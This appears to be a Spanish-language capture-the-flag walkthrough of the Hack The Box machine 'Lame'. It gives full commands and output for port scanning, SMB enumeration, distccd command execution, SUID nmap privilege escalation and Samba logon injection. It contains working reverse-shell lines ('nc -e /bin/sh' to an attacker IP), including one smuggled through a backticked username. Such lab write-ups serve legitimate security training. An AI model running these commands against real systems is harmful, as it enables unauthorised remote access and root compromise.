---
cover: ../../../../.gitbook/assets/Lame.png
coverY: 0
---

# Lame

## Reconocimiento

Primero vemos si nos responde la maquina con ping

```shell
> ping -c 1 10.10.10.3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=37.8 ms

--- 10.10.10.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 37.842/37.842/37.842/0.000 ms
```

Vamos a escanear todo el rango de puertos de la maquina

```shell
> nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3

PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63
```

Y sobre esos puertos vamos a escanear versiones

```shell
> nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN targeted
cat targeted | grep -oP '\d{1,5}/tcp.*' # Con la expression regular grepearemos la información mas relevante.
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

### Puerto 21 (ftp)

Vemos que en el escaneo en el puerto 21 (ftp) tiene el anonymous activado a si que vamos a echarle un vistazo

```shell
> ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:red): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> 
```

Vemos que no hay nada interesante.

### Puerto 445 (smb)

Vamos a ver que recursos compartidos tiene y poder entrar en alguno

```shell
> smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))

smbclient -N //10.10.10.3/tmp
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

Vemos que no podemos listar nada eso es porque por temas de seguridad no podemos conectarnos a no ser que pongamos lo siguiente en el archivo `/etc/samba/smb.conf` lo siguiente:

```shell
#======================= Global Settings =======================
[global]
client min protocol=NT1
```

Y ahora vemos que funciona

```shell
smbclient -L 10.10.10.3 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

## Explotación

Buscamos vulnerabilidades con **vsftpd 2.3.4** y parece que si que hay así que vamos a probarlo

```shell
> searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                 | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                    | unix/remote/17491.rb
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
> searchsploit -m unix/remote/49757.py
> ls
 49757.py
> mv 49757.py exploit.py
> python3 exploit.py 10.10.10.3
^C   [+]Exiting...
```

Pero parece ser que no funciona correctamente que no se puede explotar bueno vamos a seguir investigando cosas.

### Puerto 3632 (distccd)

```shell
nmap -p 3632 -sCV 10.10.10.3
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 03:21 CEST
Nmap scan report for 10.10.10.3
Host is up (0.038s latency).

PORT     STATE SERVICE VERSION
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

Nos descargamos el siguiente script .nse

```shell
wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nmap/scripts/distcc-exec.nse
```

Vemos que es vulnerable y podemos ejecutar comandos

```shell
> nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-exec: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|_      https://distcc.github.io/security.html
```

Hacemos una reverse shell

```shell
> nc -lvnp 443 # En otra ventana
```

```shell
> nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.14.2 443'"
```

```shell
> nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 60442
whoami
daemon
hostname
lame
```

### Escalada de Privilegios

Buscamos binarios con permisos SUID y vemos uno interesante

```shell
daemon@lame:/tmp$ find / -perm -4000 2>/dev/null
/usr/bin/nmap
```

Vamos aprovecharnos de que podemos ejecutar nmap como root con el modo interactivo

```shell
daemon@lame:/tmp$ nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help

nmap> help
Nmap Interactive Commands:
n <nmap args> -- executes an nmap scan using the arguments given and
waits for nmap to finish.  Results are printed to the
screen (of course you can still use file output commands).
! <command>   -- runs shell command given in the foreground
x             -- Exit Nmap
f [--spoof <fakeargs>] [--nmap-path <path>] <nmap args>
-- Executes nmap in the background (results are NOT
printed to the screen).  You should generally specify a
file for results (with -oX, -oG, or -oN).  If you specify
fakeargs with --spoof, Nmap will try to make those
appear in ps listings.  If you wish to execute a special
version of Nmap, specify --nmap-path.
n -h          -- Obtain help with Nmap syntax
h             -- Prints this help screen.
Examples:
n -sS -O -v example.com/24
f --spoof "/usr/local/bin/pico -z hello.c" -sS -oN e.log example.com/24

nmap> ! bash -p
bash-3.2# whoami
root
bash-3.2# 
```

### Puerto 445 (smb)

Para hacer una reverse shell lo primero sera ponernos en escucha con netcat al puerto que sea yo utilizare el 443

```shell
> nc -lvnp <puerto>
```

```shell
> smbclient -N //10.10.10.3/tmp
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "./=`nohup nc -e /bin/sh <tu-ip> 443`"
Password:
```

Y recibimos la reverse shell dentro como root

```shell
> nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 38088
whoami
root
hostname
lame
```
